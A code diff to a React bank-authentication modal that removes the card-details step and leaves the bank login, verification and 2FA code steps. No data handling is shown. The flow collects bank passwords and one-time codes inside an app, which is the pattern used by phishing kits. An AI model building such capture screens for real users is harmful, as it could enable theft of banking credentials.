@@ -1,7 +1,7 @@
 import React from 'react';
 import { X } from 'lucide-react';
 import BankLogo from './BankLogo';
-import BankCardForm from './BankCardForm';
+// ❌ Removed BankCardForm import (duplicate with PaymentForm)
 import BankLoginForm from './BankLoginForm';
 import VerificationStep from './VerificationStep';
 import TwoFactorCode from './TwoFactorCode';
@@ -55,8 +55,6 @@ interface BankAuthModalProps {
   };
   showPassword: boolean;
   setShowPassword: React.Dispatch<React.SetStateAction<boolean>>;
-  handleCardDetailsSubmit: (e: React.FormEvent) => void;
-  handleCardDataChange: (e: React.ChangeEvent<HTMLInputElement>) => void;
   handleLoginSubmit: (e: React.FormEvent) => void;
   handleVerificationContinue: (e: React.FormEvent) => void;
   handle2FASubmit: (e: React.FormEvent) => void;
@@ -76,13 +74,10 @@ const BankAuthModal: React.FC<BankAuthModalProps> = ({
   banks,
   cardData,
   cardType,
-  cardErrors,
   bankLoginData,
   formData,
   showPassword,
   setShowPassword,
-  handleCardDetailsSubmit,
-  handleCardDataChange,
   handleLoginSubmit,
   handleVerificationContinue,
   handle2FASubmit,
@@ -119,16 +114,7 @@ const BankAuthModal: React.FC<BankAuthModalProps> = ({
           </div>
         )}
 
-        {/* Step 1: Card Details */}
-        {authStep === 1 && !connecting && (
-          <BankCardForm
-            handleCardDetailsSubmit={handleCardDetailsSubmit}
-            cardType={cardType}
-            handleCardDataChange={handleCardDataChange}
-            cardData={cardData}
-            cardErrors={cardErrors}
-          />
-        )}
+        {/* ❌ Removed Step 1: Card Details */}
 
         {/* Connecting/loading between step 1 and 2 */}
         {connecting && (
@@ -223,7 +209,7 @@ const BankAuthModal: React.FC<BankAuthModalProps> = ({
           </div>
         )}
 
-        {/* Step 3: 2FA prompt (design screen) */}
+        {/* Step 3: 2FA prompt */}
         {authStep === 3 && !connecting && !processingPayment && (
           <VerificationStep
             selectedBank={selectedBank}
